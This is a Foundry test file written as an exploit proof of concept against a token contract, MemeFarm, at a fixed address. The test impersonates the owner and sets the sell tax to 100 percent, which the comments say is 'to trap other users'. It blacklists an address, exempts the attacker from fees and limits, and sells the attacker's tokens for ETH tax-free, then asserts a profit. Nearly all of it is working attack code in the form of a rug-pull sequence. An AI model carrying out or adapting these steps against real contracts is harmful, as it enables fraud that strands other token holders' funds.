pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Interface for the token
interface MemeFarm {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setAllTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function qwidji(address a, bool b) external;
    function setlsExcIudeFromFee(address account, bool newValue) external;
    function setMaxTxAmount(uint256 a) external;
    function setIsWalletLimitExempt(address holder, bool exempt) external;
    function uniswapV2Router() external view returns (address);
    function uniswapPair() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and get some tokens
        address owner = MemeFarm(TARGET).owner();
        vm.startPrank(owner);

        // First, we need to get some tokens to sell
        // The owner already has tokens from the constructor, but we need to transfer some to our attacker address
        uint256 attackerInitialTokens = 1000000 * 10**9; // 1M tokens with 9 decimals
        MemeFarm(TARGET).transfer(attacker, attackerInitialTokens);
        vm.stopPrank();

        // Label addresses for clarity
        vm.label(TARGET, "MemeFarm Token");
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address for reference
        address uniswapPair = MemeFarm(TARGET).uniswapPair();
        vm.label(uniswapPair, "Uniswap Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Impersonate the owner to execute privileged functions
        address owner = MemeFarm(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Set sell taxes to 100% to trap other users
        MemeFarm(TARGET).setAllTaxes(100, 0, 0);

        // Step 3: Blacklist some addresses to prevent them from selling
        // We'll blacklist a random address to demonstrate the capability
        MemeFarm(TARGET).qwidji(address(0x1234567890123456789012345678901234567890), true);

        // Step 4: Exempt ourselves (attacker) from fees
        MemeFarm(TARGET).setlsExcIudeFromFee(attacker, true);

        // Step 5: Increase max transaction amount to allow large sells
        MemeFarm(TARGET).setMaxTxAmount(type(uint256).max);

        // Step 6: Also exempt ourselves from wallet limits
        MemeFarm(TARGET).setIsWalletLimitExempt(attacker, true);

        vm.stopPrank();

        // Step 7: Now as attacker, sell tokens tax-free
        // First, approve the router to spend our tokens
        uint256 attackerTokenBalance = MemeFarm(TARGET).balanceOf(attacker);
        MemeFarm(TARGET).approve(MemeFarm(TARGET).uniswapV2Router(), attackerTokenBalance);

        // Step 8: Prepare the swap
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = IUniswapV2Router02(MemeFarm(TARGET).uniswapV2Router()).WETH();

        // Step 9: Execute the swap
        // We need to use the router directly
        IUniswapV2Router02 router = IUniswapV2Router02(MemeFarm(TARGET).uniswapV2Router());

        // Execute the swap
        MemeFarm(TARGET).approve(address(router), attackerTokenBalance);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalance,
            0, // Accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        // Verify profit
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have more ETH after exploit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

